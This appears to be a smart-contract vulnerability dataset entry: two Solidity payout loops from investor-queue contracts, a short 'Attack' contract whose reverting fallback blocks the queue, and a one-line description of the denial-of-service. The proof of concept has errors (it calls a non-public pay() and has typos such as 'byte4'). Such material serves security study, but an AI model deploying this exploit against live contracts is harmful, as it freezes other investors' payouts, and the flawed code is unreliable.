## Vulnerable Code

```javascript
**Instance_1**
 function pay() private {
        //Try to send all the money on contract to the first investors in line
        uint128 money = uint128(address(this).balance);

        //We will do cycle on the queue
        for(uint i=0; i<queue.length; i++){

            uint idx = currentReceiverIndex + i;  //get the index of the currently first investor

            Deposit storage dep = queue[idx]; //get the info of the first investor

            if(money >= dep.expect){  //If we have enough money on the contract to fully pay to investor
                dep.depositor.transfer(dep.expect); //Vulnerable position
                money -= dep.expect;            //update money left

                //this investor is fully paid, so remove him
                delete queue[idx];
            }else{
                //Here we don't have enough money so partially pay to investor
                dep.depositor.transfer(money); //Send to him everything we have
                dep.expect -= money;       //Update the expected amount
                break;                     //Exit cycle
            }

            if(gasleft() <= 50000)         //Check the gas left. If it is low, exit the cycle
                break;                     //The next investor will process the line further
        }

        currentReceiverIndex += i; //Update the index of the current first investor
    }
    
    
**Instance_2**
function pay() internal {

    uint money = address(this).balance;
    uint multiplier = 125;

    // We will do cycle on the queue
    for (uint i = 0; i < queue.length; i++){

        uint idx = currentReceiverIndex + i;  //get the index of the currently first investor

        Deposit storage dep = queue[idx]; // get the info of the first investor

        uint totalPayout = dep.deposit * multiplier / 100;
        uint leftPayout;

        if (totalPayout > dep.payout) {
            leftPayout = totalPayout - dep.payout;
        }

        if (money >= leftPayout) { //If we have enough money on the contract to fully pay to investor

            if (leftPayout > 0) {
                dep.depositor.transfer(leftPayout); // Send money to him
                money -= leftPayout;
            }

            // this investor is fully paid, so remove him
            depositNumber[dep.depositor] = 0;  //code different
            delete queue[idx];

        } else{

            // Here we don't have enough money so partially pay to investor
            dep.depositor.transfer(money); // Send to him everything we have
            dep.payout += money;       // Update the payout amount
            break;                     // Exit cycle

        }

        if (gasleft() <= 55000) {         // Check the gas left. If it is low, exit the cycle
            break;                       // The next investor will process the line further
        }
    }

    currentReceiverIndex += i; //Update the index of the current first investor
}
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“pay()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Now let's look at the position of "//Vulnerable position", as we all know 'transfer' can revert transaction if failed.so if one of 'queue' element is failed then other address will be affect. ps:"...." represent an appropriate parameter
